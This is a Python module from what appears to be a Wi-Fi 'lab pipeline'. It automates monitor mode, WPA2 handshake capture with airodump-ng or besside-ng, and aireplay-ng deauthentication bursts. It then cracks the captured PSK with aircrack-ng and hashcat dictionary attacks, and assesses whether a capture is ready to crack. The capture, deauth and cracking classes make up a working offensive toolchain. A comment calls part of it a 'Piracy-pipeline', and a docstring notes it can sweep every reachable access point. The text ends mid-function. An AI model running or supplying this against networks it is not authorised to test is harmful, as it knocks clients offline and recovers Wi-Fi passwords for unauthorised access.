from __future__ import annotations

import os
import re
import shutil
import subprocess
import tempfile
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, List, Optional, Tuple

try:
    from scapy.layers.dot11 import Dot11, Dot11EltRSN, PMKIDListPacket
    from scapy.layers.eap import EAPOL, EAPOL_KEY
    from scapy.utils import PcapReader
except Exception:  # pragma: no cover - scapy is an expected dependency, but keep capture import-safe
    Dot11 = None
    Dot11EltRSN = None
    PMKIDListPacket = None
    EAPOL = None
    EAPOL_KEY = None
    PcapReader = None

from .config import resolve_wpa_password
from .environment import IS_MACOS, IS_WINDOWS, maybe_elevate_for_capture
from .reasons import Reason, make_blocker, make_context, make_limitation
from .ui import done, err, info, ok, section, warn


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _run(cmd: List[str], cwd: Optional[str] = None, timeout: Optional[int] = None) -> subprocess.CompletedProcess:
    return subprocess.run(
        cmd,
        cwd=cwd,
        capture_output=True,
        text=True,
        check=False,
        timeout=timeout,
    )


def _require(tool: str) -> Optional[str]:
    path = shutil.which(tool)
    if not path:
        err(f"{tool} not found on PATH.")
    return path


@dataclass(frozen=True)
class WPACrackReadiness:
    state: str
    status: str
    handshake_cap: Optional[str]
    handshake_artifact: str
    crack_ready: bool
    decrypt_ready: bool
    summary: str
    detail: str
    reasons: Tuple[Reason, ...] = ()
    next_steps: Tuple[str, ...] = ()


@dataclass(frozen=True)
class WPAArtifactInspection:
    kind: str
    detail: str
    eapol_count: int = 0
    pmkid_count: int = 0
    message_numbers: Tuple[int, ...] = ()
    reasons: Tuple[Reason, ...] = ()


_MIN_HANDSHAKE_BYTES = 1024
_BSSID_RE = re.compile(r"^(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
_CHANNEL_RE = re.compile(r"^\d+(?:,\d+)*$")


def _eapol_key_message_number(key: object) -> Optional[int]:
    key_type = int(getattr(key, "key_type", 0) or 0)
    if key_type not in (0, 1):
        return None

    key_ack = bool(getattr(key, "key_ack", 0))
    has_key_mic = bool(getattr(key, "has_key_mic", 0))
    secure = bool(getattr(key, "secure", 0))
    install = bool(getattr(key, "install", 0))

    if key_ack and not has_key_mic:
        return 1
    if not key_ack and has_key_mic and secure:
        return 4
    if not key_ack and has_key_mic:
        return 2
    if key_ack and has_key_mic and (install or secure):
        return 3
    if key_ack and has_key_mic:
        return 3
    return None


def _packet_pmkid_count(packet: object) -> int:
    count = 0
    if PMKIDListPacket and packet.haslayer(PMKIDListPacket):
        pmkid_layer = packet[PMKIDListPacket]
        count += len(getattr(pmkid_layer, "pmkid_list", ()) or ())
    if count:
        return count
    if Dot11EltRSN and packet.haslayer(Dot11EltRSN):
        rsn = packet[Dot11EltRSN]
        pmkids = getattr(rsn, "pmkids", None)
        if pmkids is not None:
            return len(getattr(pmkids, "pmkid_list", ()) or ())
    return 0


def _inspect_wpa_artifact(cap_path: Path) -> WPAArtifactInspection:
    size_bytes = cap_path.stat().st_size
    parse_error = ""
    eapol_count = 0
    pmkid_count = 0
    messages: set[int] = set()

    if PcapReader and EAPOL:
        try:
            with PcapReader(str(cap_path)) as reader:
                for packet in reader:
                    if EAPOL_KEY and packet.haslayer(EAPOL_KEY):
                        eapol_count += 1
                        message_number = _eapol_key_message_number(packet[EAPOL_KEY])
                        if message_number is not None:
                            messages.add(message_number)
                    elif packet.haslayer(EAPOL):
                        eapol_count += 1
                    pmkid_count += _packet_pmkid_count(packet)
        except Exception as exc:
            parse_error = str(exc)

    message_numbers = tuple(sorted(messages))
    has_ap_message = bool(messages.intersection({1, 3}))
    has_client_message = bool(messages.intersection({2, 4}))
    if eapol_count and has_ap_message and has_client_message:
        detail = f"Detected {eapol_count} EAPOL key frames across messages {', '.join(str(number) for number in message_numbers)}."
        return WPAArtifactInspection(
            kind="valid_handshake",
            detail=detail,
            eapol_count=eapol_count,
            pmkid_count=pmkid_count,
            message_numbers=message_numbers,
            reasons=(
                make_context(
                    "wpa.handshake_valid",
                    "A valid WPA handshake appears to be present in the capture.",
                    detail=detail,
                ),
            ),
        )

    if pmkid_count and not eapol_count:
        detail = f"Detected {pmkid_count} PMKID candidate{'s' if pmkid_count != 1 else ''}, but no usable EAPOL handshake frames."
        return WPAArtifactInspection(
            kind="pmkid_only",
            detail=detail,
            eapol_count=eapol_count,
            pmkid_count=pmkid_count,
            message_numbers=message_numbers,
            reasons=(
                make_limitation(
                    "wpa.pmkid_only",
                    "The capture only contains PMKID evidence.",
                    detail=detail,
                    remediation="Capture a fuller WPA handshake, or extend the crack path before treating PMKID-only captures as supported.",
                ),
            ),
        )

    if eapol_count:
        detail = (
            f"Detected {eapol_count} EAPOL frame{'s' if eapol_count != 1 else ''}, "
            f"but only partial handshake evidence ({', '.join(str(number) for number in message_numbers) or 'unclassified messages'}) is present."
        )
        return WPAArtifactInspection(
            kind="partial_handshake",
            detail=detail,
            eapol_count=eapol_count,
            pmkid_count=pmkid_count,
            message_numbers=message_numbers,
            reasons=(
                make_blocker(
                    "wpa.handshake_partial",
                    "Only a partial WPA handshake is present.",
                    detail=detail,
                    remediation="Re-capture until both AP and client handshake messages are visible.",
                ),
            ),
        )

    if size_bytes < _MIN_HANDSHAKE_BYTES:
        detail = f"{cap_path.name} is only {size_bytes} bytes and does not contain a usable WPA artifact."
        return WPAArtifactInspection(
            kind="insufficient_capture",
            detail=detail,
            reasons=(
                make_blocker(
                    "wpa.handshake_too_small",
                    "The handshake artifact is too small to trust.",
                    detail=f"{cap_path.name} is only {size_bytes} bytes.",
                    remediation="Re-capture a fuller handshake before attempting WPA recovery.",
                ),
                make_blocker(
                    "wpa.capture_insufficient",
                    "The capture is too small and contains no usable WPA artifact.",
                    detail=detail,
                    remediation="Re-capture the target AP until EAPOL or PMKID evidence is present.",
                ),
            ),
        )

    detail = "The capture does not contain a usable WPA handshake or PMKID artifact."
    if parse_error:
        detail += f" Packet parsing failed while inspecting the capture: {parse_error}."
    return WPAArtifactInspection(
        kind="no_usable_artifact",
        detail=detail,
        reasons=(
            make_blocker(
                "wpa.no_usable_artifact",
                "The capture does not contain a usable WPA artifact.",
                detail=detail,
                remediation="Capture targeted WPA traffic until a full handshake or PMKID is present.",
            ),
        ),
    )


def _artifact_supports_crack_readiness(kind: str) -> bool:
    return kind == "valid_handshake"


def _artifact_supports_decrypt_readiness(kind: str) -> bool:
    return kind == "valid_handshake"


def _dedupe_reasons(*groups: Tuple[Reason, ...] | List[Reason]) -> Tuple[Reason, ...]:
    merged: List[Reason] = []
    seen: set[str] = set()
    for group in groups:
        for reason in group:
            if reason.code in seen:
                continue
            seen.add(reason.code)
            merged.append(reason)
    return tuple(merged)


def _dedupe_steps(*groups: Tuple[str, ...] | List[str]) -> Tuple[str, ...]:
    merged: List[str] = []
    seen: set[str] = set()
    for group in groups:
        for step in group:
            text = str(step or "").strip()
            if not text or text in seen:
                continue
            seen.add(text)
            merged.append(text)
    return tuple(merged)


def _guided_wpa_next_steps(
    state: str,
    artifact_kind: str,
    reasons: Tuple[Reason, ...],
    *,
    crack_ready: bool,
    decrypt_ready: bool,
) -> Tuple[str, ...]:
    steps = [reason.remediation for reason in reasons if reason.remediation]

    if state == "known_key_supplied":
        if decrypt_ready:
            steps.append("Proceed directly to airdecap-ng or the Wi-Fi strip step.")
        else:
            steps.append("Finish the remaining decrypt prerequisites, then run the Wi-Fi strip step.")
    elif state == "known_wordlist_attack_supported":
        steps.append("Proceed with crack/decrypt, but keep expectations tied to the wordlist and handshake quality.")
    elif artifact_kind == "insufficient_capture":
        steps.append("Capture longer on the target AP until a fuller WPA artifact is present.")
    elif artifact_kind == "no_usable_artifact":
        steps.append("Keep the adapter in monitor mode and re-capture raw 802.11 traffic from the target AP.")
    elif artifact_kind == "missing":
        steps.append("Run monitor-mode capture or point the WPA path at an existing handshake capture before retrying.")
    elif state == "unsupported" and not crack_ready and not decrypt_ready:
        steps.append("Install the missing WPA prerequisites or supply a known PSK before retrying.")

    return _dedupe_steps(steps)


def _validate_wordlist_path(wordlist: str) -> Tuple[bool, Tuple[Reason, ...]]:
    value = str(wordlist or "").strip()
    if not value:
        return (
            False,
            (
                make_blocker(
                    "wpa.wordlist_missing",
                    "A real wordlist_path is missing.",
                    remediation="Set wordlist_path to an existing wordlist file before attempting a supported WPA crack path.",
                ),
            ),
        )

    path = Path(value)
    if not path.exists() or not path.is_file():
        return (
            False,
            (
                make_blocker(
                    "wpa.wordlist_missing",
                    "A real wordlist_path is missing.",
                    remediation="Set wordlist_path to an existing wordlist file before attempting a supported WPA crack path.",
                ),
            ),
        )

    size_bytes = path.stat().st_size
    if size_bytes <= 0:
        return (
            False,
            (
                make_blocker(
                    "wpa.wordlist_empty",
                    "The configured wordlist is empty.",
                    remediation="Point wordlist_path at a non-empty wordlist before attempting a supported WPA crack path.",
                ),
            ),
        )

    non_empty_lines = 0
    try:
        with path.open("r", encoding="utf-8", errors="ignore") as handle:
            for raw_line in handle:
                if raw_line.strip():
                    non_empty_lines += 1
                    if non_empty_lines >= 2:
                        break
    except OSError:
        non_empty_lines = 0

    if non_empty_lines == 0:
        return (
            False,
            (
                make_blocker(
                    "wpa.wordlist_empty",
                    "The configured wordlist is empty.",
                    remediation="Point wordlist_path at a non-empty wordlist before attempting a supported WPA crack path.",
                ),
            ),
        )

    reasons: List[Reason] = [
        make_context(
            "wpa.wordlist_present",
            "A usable wordlist is configured.",
            detail=f"{path.name} is present and readable.",
        )
    ]
    if non_empty_lines == 1:
        reasons.append(
            make_limitation(
                "wpa.wordlist_single_entry",
                "The configured wordlist only contains a single visible candidate.",
                remediation="Use a broader wordlist if you expect the supported crack path to have a realistic chance of success.",
            )
        )
    return True, tuple(reasons)


def _retry_capture_reasons(config: Dict[str, object], artifact_kind: str) -> Tuple[Reason, ...]:
    if artifact_kind == "valid_handshake":
        return ()

    monitor_method = str(config.get("monitor_method") or "airodump").strip().lower()
    if monitor_method != "airodump":
        return ()

    bssid = str(config.get("ap_bssid") or "").strip()
    channel = str(config.get("ap_channel") or "").strip()
    reasons: List[Reason] = []

    if not bssid:
        reasons.append(
            make_blocker(
                "wpa.capture_bssid_missing",
                "ap_bssid is missing for targeted airodump-ng capture retries.",
                remediation="Set ap_bssid before expecting the targeted airodump-ng retry path to be ready.",
            )
        )
    elif not _BSSID_RE.fullmatch(bssid):
        reasons.append(
            make_blocker(
                "wpa.capture_bssid_invalid",
                "ap_bssid is not in MAC-address form.",
                detail=f"Got `{bssid}`.",
                remediation="Set ap_bssid to a colon-delimited BSSID like 00:11:22:33:44:55.",
            )
        )

    if not channel:
        reasons.append(
            make_blocker(
                "wpa.capture_channel_missing",
                "ap_channel is missing for targeted airodump-ng capture retries.",
                remediation="Set ap_channel before expecting the targeted airodump-ng retry path to be ready.",
            )
        )
    elif not _CHANNEL_RE.fullmatch(channel):
        reasons.append(
            make_blocker(
                "wpa.capture_channel_invalid",
                "ap_channel is not in a supported channel form.",
                detail=f"Got `{channel}`.",
                remediation="Use a numeric channel like 1, 6, 11, or a comma-separated list such as 36,40.",
            )
        )

    if not reasons and bssid and channel:
        reasons.append(
            make_context(
                "wpa.capture_target_present",
                "Targeted airodump-ng retry settings are configured.",
                detail=f"BSSID {bssid} on channel {channel}.",
            )
        )

    return tuple(reasons)


def _capture_condition_reasons(cap_path: Path, target_bssid: str = "") -> Tuple[Reason, ...]:
    normalized_bssid = str(target_bssid or "").strip().lower()
    if not PcapReader or not Dot11:
        return ()

    dot11_count = 0
    target_seen = not normalized_bssid
    try:
        with PcapReader(str(cap_path)) as reader:
            for packet in reader:
                if not packet.haslayer(Dot11):
                    continue
                dot11_count += 1
                if normalized_bssid:
                    dot11 = packet[Dot11]
                    addresses = {
                        str(getattr(dot11, field) or "").strip().lower()
                        for field in ("addr1", "addr2", "addr3")
                    }
                    if normalized_bssid in addresses:
                        target_seen = True
    except Exception as exc:
        return (
            make_limitation(
                "wpa.capture_conditions_unverified",
                "Capture conditions could not be fully verified from the artifact.",
                detail=str(exc),
            ),
        )

    reasons: List[Reason] = []
    if dot11_count == 0:
        reasons.append(
            make_blocker(
                "wpa.capture_not_80211",
                "The capture does not appear to contain raw 802.11 traffic.",
                remediation="Re-run monitor-mode capture or point WPA recovery at a real Wi-Fi capture file.",
            )
        )
    if normalized_bssid:
        if target_seen:
            reasons.append(
                make_context(
                    "wpa.capture_target_observed",
                    f"Frames for target BSSID {normalized_bssid} were observed in the capture.",
                )
            )
        else:
            reasons.append(
                make_blocker(
                    "wpa.capture_target_not_observed",
                    "The configured target BSSID does not appear in the capture.",
                    remediation="Verify ap_bssid, channel lock, monitor interface, and capture timing before retrying the WPA path.",
                )
            )
    return tuple(reasons)


# ---------------------------------------------------------------------------
# Windows Npcap monitor-mode helper (WlanHelper.exe)
# ---------------------------------------------------------------------------

_GUID_RE = re.compile(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}")


def _extract_guid(text: str) -> Optional[str]:
    match = _GUID_RE.search(text or "")
    return match.group(0) if match else None


def _find_wlanhelper() -> Optional[str]:
    if not IS_WINDOWS:
        return None

    for name in ("WlanHelper.exe", "WlanHelper"):
        found = shutil.which(name)
        if found:
            return found

    system_root = os.environ.get("SYSTEMROOT") or os.environ.get("SystemRoot") or r"C:\Windows"
    candidates = [
        os.path.join(system_root, "System32", "Npcap", "WlanHelper.exe"),
        os.path.join(system_root, "Sysnative", "Npcap", "WlanHelper.exe"),
        os.path.join(os.environ.get("ProgramFiles", r"C:\Program Files"), "Npcap", "WlanHelper.exe"),
        os.path.join(os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)"), "Npcap", "WlanHelper.exe"),
    ]
    for candidate in candidates:
        if candidate and os.path.exists(candidate):
            return candidate

    return None


def _wlanhelper_target(interface: str) -> str:
    """
    WlanHelper expects a Wi-Fi interface Name or GUID (netsh wlan show interfaces).
    The pipeline config often stores a Npcap device like \\Device\\NPF_{GUID}.
    Prefer the GUID form when we can extract it.
    """
    guid = _extract_guid(interface)
    return guid or interface


def _wlanhelper_get_mode(wlanhelper: str, target: str) -> Optional[str]:
    result = _run([wlanhelper, target, "mode"], timeout=5)
    output = (result.stdout or result.stderr or "").strip().lower()
    for line in output.splitlines():
        line = line.strip()
        if line in ("managed", "monitor"):
            return line
    return None


def _wlanhelper_set_mode(wlanhelper: str, target: str, mode: str) -> bool:
    result = _run([wlanhelper, target, "mode", mode], timeout=10)
    output = (result.stdout or result.stderr or "").strip()
    if result.returncode != 0:
        err(f"WlanHelper failed: {output or 'unknown error'}")
        return False
    # Typical output is "Success", but treat any exit code 0 as success.
    return True


# ---------------------------------------------------------------------------
# Monitor-mode helpers  (wi-fi lab pipeline — Linux, macOS, Windows)
# ---------------------------------------------------------------------------

class MonitorMode:
    """
    Wraps airmon-ng enable/disable on Linux and Npcap WlanHelper on Windows.
    If Windows monitor mode switching is unavailable, the caller can still use a
    pre-configured monitor interface (e.g. a USB adapter set to monitor mode externally).
    """

    def __init__(self, interface: str) -> None:
        self.base_interface = interface
        self.monitor_interface: Optional[str] = None
        self._previous_windows_mode: Optional[str] = None

    def enable(self) -> Optional[str]:
        """
        Put the card into monitor mode.
        Returns the monitor interface name (e.g. 'wlan0mon') or None on failure.
        """
        if IS_WINDOWS:
            wlanhelper = _find_wlanhelper()
            if not wlanhelper:
                warn("WlanHelper.exe not found. Cannot switch monitor mode automatically on Windows.")
                warn("Install Npcap with 802.11 support and run as Administrator.")
                self.monitor_interface = self.base_interface
                return self.base_interface

            target = _wlanhelper_target(self.base_interface)
            previous = _wlanhelper_get_mode(wlanhelper, target)
            self._previous_windows_mode = previous

            if previous == "monitor":
                ok("Adapter already in monitor mode.")
                self.monitor_interface = self.base_interface
                return self.base_interface

            info("Enabling monitor mode via Npcap WlanHelper...")
            if not _wlanhelper_set_mode(wlanhelper, target, "monitor"):
                err("Unable to enable monitor mode. Verify adapter/driver support and Npcap settings.")
                return None

            # Best-effort verification so we can warn if the driver ignored the request.
            now = _wlanhelper_get_mode(wlanhelper, target)
            if now != "monitor":
                warn("WlanHelper ran but mode did not read back as monitor.")
                warn("Your adapter/driver may not support Npcap monitor mode.")

            ok("Monitor mode enabled.")
            self.monitor_interface = self.base_interface
            return self.base_interface

        airmon = _require("airmon-ng")
        if not airmon:
            if IS_WINDOWS:
                warn("airmon-ng not found on Windows. Using interface as-is for aircrack-ng tools.")
                self.monitor_interface = self.base_interface
                return self.base_interface
            return None

        # Kill interfering processes first
        _run(["airmon-ng", "check", "kill"])

        result = _run(["airmon-ng", "start", self.base_interface])
        # airmon-ng prints something like "monitor mode vif enabled for ... on wlan0mon"
        mon_iface = None
        for line in result.stdout.splitlines():
            if "monitor mode" in line.lower() and "enabled" in line.lower():
                # Try to extract interface name from the last token on the line
                parts = line.split()
                for part in reversed(parts):
                    if part.startswith("wlan") or part.startswith("mon"):
                        mon_iface = part.rstrip(")")
                        break
        if not mon_iface:
            # Fallback: conventional naming
            mon_iface = self.base_interface + "mon"

        if result.returncode != 0:
            err(f"airmon-ng failed: {result.stderr.strip() or result.stdout.strip()}")
            return None

        ok(f"Monitor mode enabled on {mon_iface}")
        self.monitor_interface = mon_iface
        return mon_iface

    def disable(self) -> None:
        if not self.monitor_interface:
            return
        if IS_WINDOWS:
            wlanhelper = _find_wlanhelper()
            if not wlanhelper:
                return
            target = _wlanhelper_target(self.base_interface)
            restore = self._previous_windows_mode or "managed"
            info(f"Restoring Windows Wi-Fi mode: {restore}")
            _wlanhelper_set_mode(wlanhelper, target, restore)
            return
        airmon = shutil.which("airmon-ng")
        if airmon:
            _run(["airmon-ng", "stop", self.monitor_interface])
            ok(f"Monitor mode disabled on {self.monitor_interface}")


# ---------------------------------------------------------------------------
# Handshake capture (wi-fi lab pipeline steps 3 & 4)
# ---------------------------------------------------------------------------

class HandshakeCapture:
    """
    Captures a WPA2 4-way handshake using either besside-ng (automatic,
    handles deauth itself) or airodump-ng (targeted, channel + BSSID).

    Targets the configured AP BSSID and channel.
    """

    def __init__(self, config: Dict[str, object], output_dir: Path) -> None:
        self.config = config
        self.output_dir = output_dir
        self.handshake_path: Optional[Path] = None

    def capture_besside(self, mon_interface: str) -> Optional[str]:
        """
        besside-ng automatic handshake grabber.
        Targets only the configured BSSID/ESSID when provided, otherwise
        sweeps all reachable APs (lab use — make sure you own them all).
        """
        section("Handshake Capture — besside-ng")
        besside = _require("besside-ng")
        if not besside:
            return None

        bssid = str(self.config.get("ap_bssid") or "").strip()
        out_file = self.output_dir / "besside_handshakes.cap"
        duration = int(self.config.get("handshake_timeout", 120) or 120)

        cmd = ["besside-ng", "-W", str(out_file)]
        if bssid:
            cmd.extend(["-b", bssid])
        cmd.append(mon_interface)

        info(f"besside-ng running for up to {duration}s on {mon_interface} …")
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=duration, check=False)
        except subprocess.TimeoutExpired:
            info("besside-ng timeout reached — checking for handshakes.")

        if out_file.exists() and out_file.stat().st_size > 0:
            ok(f"Handshake capture saved to {out_file}")
            self.handshake_path = out_file
            return str(out_file)

        err("besside-ng produced no output.")
        return None

    def capture_airodump(self, mon_interface: str) -> Optional[str]:
        """
        airodump-ng targeted capture.
        Requires ap_bssid and ap_channel in config.
        """
        section("Handshake Capture — airodump-ng")
        airodump = _require("airodump-ng")
        if not airodump:
            return None

        bssid = str(self.config.get("ap_bssid") or "").strip()
        channel = str(self.config.get("ap_channel") or "").strip()
        if not bssid or not channel:
            err("ap_bssid and ap_channel must be set in config for airodump-ng capture.")
            return None

        prefix = str(self.output_dir / "airodump_hs")
        duration = int(self.config.get("handshake_timeout", 120) or 120)

        cmd = [
            "airodump-ng",
            "--bssid", bssid,
            "-c", channel,
            "-w", prefix,
            "--output-format", "pcap",
            mon_interface,
        ]
        info(f"airodump-ng targeting BSSID {bssid} ch{channel} for {duration}s …")

        # Optional deauth burst to speed up handshake (aireplay-ng --deauth)
        self._maybe_deauth(mon_interface, bssid)

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=duration, check=False)
        except subprocess.TimeoutExpired:
            info("airodump-ng timeout — checking for handshake file.")

        # airodump writes <prefix>-01.cap
        cap_file = Path(prefix + "-01.cap")
        if not cap_file.exists():
            # Try pcapng variant
            cap_file = Path(prefix + "-01.pcapng")
        if cap_file.exists() and cap_file.stat().st_size > 0:
            ok(f"airodump-ng capture saved to {cap_file}")
            self.handshake_path = cap_file
            return str(cap_file)

        err("airodump-ng produced no capture file.")
        return None

    def _maybe_deauth(self, mon_interface: str, bssid: str) -> None:
        """Send a small deauth burst to force client reconnect / handshake."""
        aireplay = shutil.which("aireplay-ng")
        if not aireplay:
            return
        deauth_count = int(self.config.get("deauth_count", 10) or 10)
        info(f"Sending {deauth_count} deauth frames to {bssid} …")
        subprocess.Popen(
            ["aireplay-ng", "--deauth", str(deauth_count), "-a", bssid, mon_interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(3)  # brief pause so deauth lands before capture window


# ---------------------------------------------------------------------------
# WPA2 cracking (wi-fi lab pipeline steps 5 & 6)
# ---------------------------------------------------------------------------

class WPACracker:
    """
    Attempts to recover the WPA2 PSK from a captured handshake file.
    Tries aircrack-ng first (option {5}), then hashcat (option {6}).
    """

    def __init__(self, config: Dict[str, object]) -> None:
        self.config = config

    def crack_aircrack(self, handshake_cap: str) -> Optional[str]:
        """Option {5}: aircrack-ng dictionary attack."""
        section("WPA2 Crack — aircrack-ng")
        aircrack = _require("aircrack-ng")
        if not aircrack:
            return None

        wordlist = str(self.config.get("wordlist_path") or "").strip()
        if not wordlist or not Path(wordlist).exists():
            err("wordlist_path not configured or file not found. Cannot run aircrack-ng.")
            return None

        bssid = str(self.config.get("ap_bssid") or "").strip()
        cmd = ["aircrack-ng", "-w", wordlist]
        if bssid:
            cmd.extend(["-b", bssid])
        cmd.append(handshake_cap)

        info("Running aircrack-ng …")
        result = _run(cmd, timeout=int(self.config.get("crack_timeout", 600) or 600))

        for line in result.stdout.splitlines():
            if "KEY FOUND!" in line:
                # Line looks like:  KEY FOUND! [ password ]
                start = line.find("[")
                end = line.find("]")
                if start != -1 and end != -1:
                    psk = line[start + 1:end].strip()
                    ok(f"aircrack-ng recovered PSK: {psk}")
                    return psk

        warn("aircrack-ng did not find the key in the provided wordlist.")
        return None

    def crack_hashcat(self, handshake_cap: str) -> Optional[str]:
        """
        Option {6}: hashcat PMKID / HCCAPX attack.
        Requires hcxtools (cap2hccapx or hcxpcapngtool) to convert the capture.
        """
        section("WPA2 Crack — hashcat")
        hashcat = _require("hashcat")
        if not hashcat:
            return None

        wordlist = str(self.config.get("wordlist_path") or "").strip()
        if not wordlist or not Path(wordlist).exists():
            err("wordlist_path not configured or file not found. Cannot run hashcat.")
            return None

        # Convert .cap → .hccapx
        hccapx = self._convert_to_hccapx(handshake_cap)
        if not hccapx:
            return None

        potfile = str(Path(hccapx).with_suffix(".pot"))
        cmd = [
            "hashcat",
            "-m", "2500",       # WPA/WPA2
            "-a", "0",          # dictionary
            "--potfile-path", potfile,
            "--status",
            "--status-timer", "10",
            hccapx,
            wordlist,
        ]
        rules = str(self.config.get("hashcat_rules") or "").strip()
        if rules and Path(rules).exists():
            cmd.extend(["-r", rules])

        info("Running hashcat …")
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                check=False,
                timeout=int(self.config.get("crack_timeout", 600) or 600),
            )
        except subprocess.TimeoutExpired:
            info("hashcat timeout reached.")

        # Read potfile for recovered key
        pot = Path(potfile)
        if pot.exists() and pot.stat().st_size > 0:
            line = pot.read_text(encoding="utf-8", errors="replace").strip().splitlines()[-1]
            if ":" in line:
                psk = line.rsplit(":", 1)[-1].strip()
                ok(f"hashcat recovered PSK: {psk}")
                return psk

        warn("hashcat did not find the key.")
        return None

    def _convert_to_hccapx(self, cap_path: str) -> Optional[str]:
        """Convert a .cap file to .hccapx using cap2hccapx or hcxpcapngtool."""
        out = str(Path(cap_path).with_suffix(".hccapx"))

        for tool in ("cap2hccapx", "hcxpcapngtool"):
            binary = shutil.which(tool)
            if not binary:
                continue
            if tool == "cap2hccapx":
                cmd = [binary, cap_path, out]
            else:
                cmd = [binary, "-o", out, cap_path]
            result = _run(cmd)
            if Path(out).exists() and Path(out).stat().st_size > 0:
                ok(f"Converted capture to {out} via {tool}")
                return out

        err("Neither cap2hccapx nor hcxpcapngtool found. Install hcxtools.")
        return None

    def crack(self, handshake_cap: str) -> Optional[str]:
        """Try aircrack-ng first; fall back to hashcat."""
        psk = self.crack_aircrack(handshake_cap)
        if not psk:
            psk = self.crack_hashcat(handshake_cap)
        return psk


# ---------------------------------------------------------------------------
# Main Capture class (wi-fi lab pipeline integrated)
# ---------------------------------------------------------------------------

class Capture:
    def __init__(self, config: Dict[str, object]) -> None:
        self.config = config
        output_dir = Path(str(config.get("output_dir") or "./pipeline_output"))
        self.output_dir = output_dir
        self.raw_capture = output_dir / "raw_capture.pcapng"
        self.decrypted_capture = output_dir / "decrypted_wifi.pcapng"

        # Piracy-pipeline sub-objects
        self._monitor: Optional[MonitorMode] = None
        self._handshake: Optional[HandshakeCapture] = None
        self._cracker = WPACracker(config)

    def _resolve_handshake_cap(self, handshake_cap: Optional[str] = None) -> Optional[Path]:
        cap = handshake_cap
        if not cap and self._handshake and self._handshake.handshake_path:
            cap = str(self._handshake.handshake_path)
        if not cap:
            preferred_names = (
                "airodump_hs-01.cap",
                "airodump_hs-01.pcapng",
                "besside_handshakes.cap",
                "monitor_raw.pcap",
                "monitor_raw.pcapng",
            )
            for name in preferred_names:
                candidate = self.output_dir / name
                if candidate.exists():
                    return candidate

            caps = []
            for pattern in ("*handshake*.cap", "*handshake*.pcap", "*handshake*.pcapng", "*hs*.cap", "*hs*.pcap", "*hs*.pcapng"):
                caps.extend(self.output_dir.glob(pattern))
            if caps:
                cap = str(max(caps, key=lambda p: p.stat().st_mtime))
        if not cap:
            return None
        return Path(cap)

    def inspect_wpa_crack_path(self, handshake_cap: Optional[str] = None) -> WPACrackReadiness:
        def _build_readiness(
            *,
            state: str,
            status: str,
            handshake_cap_value: Optional[str],
            handshake_artifact: str,
            crack_ready: bool,
            decrypt_ready: bool,
            summary: str,
            detail: str,
            reasons: Tuple[Reason, ...],
        ) -> WPACrackReadiness:
            return WPACrackReadiness(
                state=state,
                status=status,
                handshake_cap=handshake_cap_value,
                handshake_artifact=handshake_artifact,
                crack_ready=crack_ready,
                decrypt_ready=decrypt_ready,
                summary=summary,
                detail=detail,
                reasons=reasons,
                next_steps=_guided_wpa_next_steps(
                    state,
                    handshake_artifact,
                    reasons,
                    crack_ready=crack_ready,
                    decrypt_ready=decrypt_ready,
                ),
            )

        cap_path = self._resolve_handshake_cap(handshake_cap)
        password = resolve_wpa_password(self.config)
        essid = str(self.config.get("ap_essid") or "").strip()
        bssid = str(self.config.get("ap_bssid") or "").strip()
        wordlist = str(self.config.get("wordlist_path") or "").strip()
        wordlist_ready, wordlist_reasons = _validate_wordlist_path(wordlist)
        aircrack_path = shutil.which("aircrack-ng")
        hashcat_path = shutil.which("hashcat")
        cap2hccapx_path = shutil.which("cap2hccapx")
        hcxpcapngtool_path = shutil.which("hcxpcapngtool")
        airdecap_path = shutil.which("airdecap-ng")
        has_aircrack = bool(aircrack_path)
        has_hashcat = bool(hashcat_path)
        has_converter = bool(cap2hccapx_path or hcxpcapngtool_path)
        has_airdecap = bool(airdecap_path)
        converter_name = "cap2hccapx" if cap2hccapx_path else "hcxpcapngtool" if hcxpcapngtool_path else ""
        retry_capture_reasons = _retry_capture_reasons(self.config, "missing")

        if not cap_path or not cap_path.exists():
            reasons = (
                make_blocker(
                    "wpa.handshake_missing",
                    "No handshake capture is available yet.",
                    remediation="Run monitor or point crack/decrypt at a real handshake capture before attempting WPA recovery.",
                ),
            ) + retry_capture_reasons
            return _build_readiness(
                state="unsupported",
                status="unsupported",
                handshake_cap_value=str(cap_path) if cap_path else None,
                handshake_artifact="missing",
                crack_ready=False,
                decrypt_ready=False,
                summary="No handshake capture is available yet.",
                detail="Run monitor or point crack/decrypt at a real handshake capture before attempting WPA recovery.",
                reasons=reasons,
            )

        artifact = _inspect_wpa_artifact(cap_path)
        capture_condition_reasons = _capture_condition_reasons(
            cap_path,
            bssid if _BSSID_RE.fullmatch(bssid) else "",
        )
        artifact_supports_crack = _artifact_supports_crack_readiness(artifact.kind)
        artifact_supports_decrypt = _artifact_supports_decrypt_readiness(artifact.kind)
        capture_conditions_blocked = any(reason.kind == "blocker" for reason in capture_condition_reasons)
        capture_not_80211 = any(reason.code == "wpa.capture_not_80211" for reason in capture_condition_reasons)
        retry_capture_reasons = _retry_capture_reasons(self.config, artifact.kind)
        decrypt_ready = bool(password and essid and has_airdecap and artifact_supports_decrypt and not capture_conditions_blocked)
        if artifact.kind == "insufficient_capture" and capture_not_80211:
            reasons = _dedupe_reasons(
                artifact.reasons,
                capture_condition_reasons,
                (
                    make_blocker(
                        "wpa.no_usable_artifact",
                        "The capture does not contain a usable WPA artifact.",
                        remediation="Capture targeted WPA traffic until a real handshake or PMKID artifact is present.",
                    ),
                ),
                retry_capture_reasons,
            )
            return _build_readiness(
                state="unsupported",
                status="unsupported",
                handshake_cap_value=str(cap_path),
                handshake_artifact="no_usable_artifact",
                crack_ready=False,
                decrypt_ready=False,
                summary="The capture does not appear to contain raw 802.11 traffic.",
                detail="The artifact is too small to contain a usable WPA exchange, and it does not appear to be an 802.11 capture.",
                reasons=reasons,
            )
        if artifact.kind == "insufficient_capture":
            reasons = _dedupe_reasons(artifact.reasons, capture_condition_reasons, retry_capture_reasons)
            return _build_readiness(
